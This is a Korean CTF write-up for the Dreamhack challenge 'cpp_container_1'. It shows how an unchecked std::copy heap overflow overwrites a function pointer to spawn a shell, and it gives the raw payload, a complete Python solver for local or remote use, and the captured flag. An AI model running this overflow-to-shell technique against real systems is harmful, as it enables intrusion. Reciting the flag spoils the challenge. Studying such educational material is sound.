# cpp_container_1 Writeup

## TL;DR

`std::copy(src.begin(), src.end(), dest.begin())`에서 `dest`의 크기를 검사하지 않아 heap overflow가 발생한다.
`dest` chunk 뒤에 `Menu` 객체가 할당되므로, `dest`를 넘겨 `Menu::fp`를 `getshell()` 주소로 덮으면 다음 메뉴 출력 시 `system("/bin/sh")`가 실행된다.

Flag:

```text
DH{797c9c479e623eb790bd3ae646fb8440}
```

## 보호 기법

문제 설명 기준:

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE disabled
```

PIE가 꺼져 있어서 바이너리 내 함수 주소가 고정이다.

```text
getshell() = 0x401041
```

## 취약점

핵심 코드는 다음과 같다.

```cpp
void copy_container(std::vector<int> &src, std::vector<int> &dest){
	std::copy(src.begin(), src.end(), dest.begin());
	std::cout << "copy complete!" << std::endl;
}
```

`std::copy()`는 `src` 전체를 `dest.begin()`부터 복사한다.
하지만 `dest`가 `src`보다 작은지 확인하지 않는다.

컨테이너 크기는 사용자가 조절할 수 있다.

```cpp
void modify_container(std::vector<int> &src, std::vector<int> &dest){
	int size = 0;

	std::cout << "Input container1 size" << std::endl;
	std::cin >> size;
	src.resize(size);

	std::cout << "Input container2 size" << std::endl;
	std::cin >> size;
	dest.resize(size);
}
```

따라서 `src`를 크게, `dest`를 작게 만든 뒤 `copy_container()`를 호출하면 `dest` 뒤 heap 영역을 덮을 수 있다.

## 공격 대상

`main()`에서 heap 객체들이 다음 순서로 만들어진다.

```cpp
std::vector<int> src(3, 0);
std::vector<int> dest(3, 0);
Menu *menu = new Menu();
```

`Menu` 객체는 함수 포인터 하나를 가진다.

```cpp
class Menu{
public:
	Menu(){
	}
	Menu(const Menu&){
	}
	void (*fp)(void) = print_menu;
};
```

루프마다 이 함수 포인터가 호출된다.

```cpp
while(1){
	menu->fp();
	std::cin >> selector;
	...
}
```

즉, overflow로 `menu->fp`를 `getshell()`로 바꾸면 다음 루프에서 셸이 실행된다.

## Heap Layout

초기 상태에서 `src`, `dest`, `menu`가 heap에 순서대로 잡힌다.
`std::vector<int>`의 데이터는 `int` 배열이므로 4바이트 단위로 덮는다.

공격에서는 다음처럼 크기를 조정했다.

```text
src.size  = 10
dest.size = 3
```

이후 `src`의 9번째 원소에 `getshell()` 주소를 넣었다.

```text
src[8] = 0x401041
```

`std::copy()`가 `src` 10개를 `dest` 3개 공간에 복사하면서 `dest` 뒤쪽을 계속 덮고, `src[8]` 위치의 값이 `menu->fp`에 들어간다.

주소 `0x401041`은 10진수로 다음과 같다.

```text
4198465
```

프로그램이 `int` 입력을 받기 때문에 payload에는 10진수 값을 사용하면 된다.

## Exploit

입력 흐름은 다음과 같다.

1. 메뉴 `2`로 `src`, `dest` 크기 조정
2. `src.size = 10`, `dest.size = 3`
3. 메뉴 `1`로 `src` 데이터 입력
4. `src[8] = 4198465` 입력
5. 메뉴 `3`으로 overflow 발생
6. 다음 루프에서 `menu->fp()`가 `getshell()` 호출
7. 셸에서 `cat flag`

최종 payload:

```text
2
10
3
1
0
0
0
0
0
0
0
0
4198465
0
0
0
0
3
cat flag
exit
```

## Solver

작성한 solver는 `solve.py`이다.

```python
#!/usr/bin/env python3
import socket
import subprocess
import sys
import time


GETSHELL = 0x401041


def build_script():
    src = [
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        GETSHELL,
        0,
    ]

    lines = [
        "2",
        str(len(src)),
        "3",
        "1",
        *map(str, src),
        "0",
        "0",
        "0",
        "3",
        "cat flag",
        "exit",
    ]
    return ("\n".join(lines) + "\n").encode()


def run_local():
    p = subprocess.Popen(
        ["./cpp_container_1"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    try:
        out, _ = p.communicate(build_script(), timeout=5)
    except subprocess.TimeoutExpired:
        p.kill()
        out, _ = p.communicate()
    return out


def run_remote(host, port):
    data = build_script()
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(data)
        s.settimeout(2)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def main():
    if len(sys.argv) == 1:
        sys.stdout.buffer.write(run_local())
        return

    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} [HOST PORT]", file=sys.stderr)
        raise SystemExit(1)

    sys.stdout.buffer.write(run_remote(sys.argv[1], int(sys.argv[2])))
    time.sleep(0.1)


if __name__ == "__main__":
    main()
```

원격 실행:

```bash
python3 solve.py host3.dreamhack.games 16356
```

결과:

```text
copy complete!
DH{797c9c479e623eb790bd3ae646fb8440}
```
